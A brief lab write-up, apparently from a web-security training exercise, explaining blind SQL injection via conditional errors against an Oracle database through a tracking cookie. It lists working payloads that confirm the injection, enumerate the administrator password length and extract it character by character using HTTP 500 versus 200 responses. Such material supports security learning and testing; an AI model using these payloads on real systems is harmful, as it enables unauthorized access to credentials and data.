Blind SQL Injection â€” Conditional Errors (Oracle)
Overview

This lab exploits a Blind SQL Injection using conditional database errors.
The application reveals information through HTTP status code changes when an SQL error is triggered.

Technical Context

Injection point: tracking cookie

Database engine: Oracle

Target account: administrator

Oracle String Concatenation

Oracle requires explicit string concatenation and a table reference:

'||(SELECT 'a' FROM dual)||'

Triggering Conditional Errors
'||(
SELECT CASE
WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'

Behavior

1/0 causes a division-by-zero error

HTTP 500 indicates a true condition

HTTP 200 indicates a false condition

Password Length Enumeration
'||(
SELECT CASE
WHEN (LENGTH(password)=20)
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'

Password Extraction
'||(
SELECT CASE
WHEN (SUBSTR(password,1,1)='a')
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator'
)||'


The process is repeated for each character position.

Conclusion

Conditional errors can be abused as a reliable side channel to extract sensitive data from Oracle databases.
